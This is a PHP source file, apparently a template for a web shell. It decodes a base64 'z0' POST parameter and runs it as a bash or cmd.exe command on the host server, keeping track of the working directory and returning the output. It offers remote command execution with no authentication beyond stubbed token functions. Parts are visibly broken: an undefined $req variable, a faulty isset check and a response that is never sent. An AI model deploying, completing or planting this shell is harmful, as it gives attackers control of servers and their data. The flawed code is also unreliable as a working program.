<?php

function seal_token($data) {

}

function open_token($token)
{

}

//----------[THE CODE ABOVE WILL NOT BE INCLUDED]----------

function get_shell() {
    // Linux/Mac: use bash with PTY
    // Windows: fall back to cmd.exe with pipes
    if (PHP_OS_FAMILY === 'Windows') {
        return ['cmd.exe', false];
    }

    return ['/bin/bash', true];
}

function session_file($sid) {
    return sys_get_temp_dir()."/pty_sess_".md5($sid).".json";
}

function proc_read($pipes){
    $out = '';
    foreach ([1, 2] as $fd) {
        if (!isset($pipes))
            continue;

        $read = [$pipes[$fd]];
        $w = $e = [];

        if (stream_select($read, $w, $e, 0, 50000)) {
            $chunk = fread($pipes[$fd], 8192);
            if ($chunk !== false)
                $out .= $chunk;
        }
    }

    return $out;
}

function start_process($sid) {
    [$shell, $isPty] = get_shell();
    if ($isPty) {
        $desc = [
            0 => ['pty'],
            1 => ['pty'],
            2 => ['pty'],
        ];
    } else {
        $desc = [
            0 => ['pipe', 'r'],
            1 => ['pipe', 'w'],
            2 => ['pipe', 'w'],
        ];
    }

    $env = array_merge($_ENV, [
        'TERM' => 'xterm-256color',
        'COLUMNS' => '220',
        'LINES' => '50',
        'HOME' => $_SERVER['HOME'] ?? '/tmp',
        'PATH' => '/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin',
    ]);

    $proc = proc_open($shell, $desc, $pipes, null, $env);
    if (!is_resource($proc))
        return null;

    stream_set_blocking($pipes[1], false);
    if (isset($pipes[2]))
        stream_set_blocking($pipes[2], false);

    $status = proc_get_status($proc);
    $pid = $status['pid'];

    $meta = [
        'pid' => $pid,
        'is_pety' => $isPty,
        'shell' => $shell,
        'stdin' => $isPty ? "/proc/$pid/fd/0" : null,
        'stdout' => $isPty ? "/proc/$pid/fd/1" : null,
    ];

    file_put_contents(session_file($sid), json_encode($meta));

    usleep(300000);
    $init = proc_read($pipes);

    return [
        'meta' => $meta,
        'init' => $init,
        'pipes' => $pipes,
        'proc' => $proc
    ];
}

function exec_command($cmd, $cwd, $env_vars) {
    if (PHP_OS_FAMILY === 'Windows') {
        $shell_cmd = "cd /d " . escapeshellarg($cwd) . " && " . $cmd . " 2>&1";
        $wrapper = ['cmd.exe', '/c', $shell_cmd];
    } else {
        $shell_cmd = "cd " . escapeshellarg($cwd) . " && " . $cmd . " 2>&1; echo \"__EXIT__:$?\"";
        $wrapper = ['/bin/bash', '-c', $shell_cmd];
    }

    $desc = [
        0 => ['pipe', 'r'],
        1 => ['pipe', 'w'],
        2 => ['pipe', 'w'],
    ];

    $env = array_merge($_ENV ? : [], $env_vars, [
        'TERM' => 'xterm-256color',
        'COLUMNS' => '220',
        'LINES' => '50',
    ]);

    $proc = proc_open($wrapper, $desc, $pipes, $cwd, $env);
    if (!is_resource($proc))
        return ['output' => 'Failed to spawn process', 'exit' => 1, 'cwd' => $cwd];

    fclose($pipes[0]);

    $output = '';
    $timeout = microtime(true) + 10.0; // 10 second timeout
    while (microtime(true) < $timeout) {
        $read = [$pipes[1]];
        $w = $e = [];
        if (stream_select($read, $w, $e, 0, 100000)) {
            $chunk = fread($pipes[1], 8192);
            if ($chunk === false || $chunk === '')
                break;

            $output .= $chunk;
        }

        if (feof($pipes[1]))
            break;
    }

    fclose($pipes[1]);
    fclose($pipes[2]);
    $exit = proc_close($proc);

    $new_cwd = $cwd;
    if (preg_match('/^cd\s+(.+)/m', $cmd, $m)) {
        $target = trim($m[1]);
        $resolved = realpath(
            (strpos($target, '/') === 0 || strpos($target, '\\') !== false)
                ? $target
                : $cwd . DIRECTORY_SEPARATOR . $target
        );

        if ($resolved && is_dir($resolved))
            $new_cwd = $resolved;
    }

    $exit_code = 0;
    if (preg_match('/__EXIT__:(\d+)\s*$/', $output, $m)) {
        $exit_code = (int)$m[1];
        $output = preg_replace('/__EXIT__:\d+\s*$/', '', $output);
    }

    return [
        'output' => $output,
        'exit' => $exit_code,
        'cwd' => $new_cwd,
    ];
}

$input = base64_decode($_POST['z0']) ?? '';
$input = rtrim($input, '\r\n');

$state = open_token($req['handshakeToken']);
$cwd = $state['cwd'];
$env = $state['env'] ?? [];

$result = exec_command($input, $cwd, $env);

$state['cwd'] = $result['cwd'];

$resp = [
    "cmd" => "terminal_output",
    "output" => $result['output'],
    "exit" => $result['exit'],
    "cwd" => $result['cwd'],
];

?>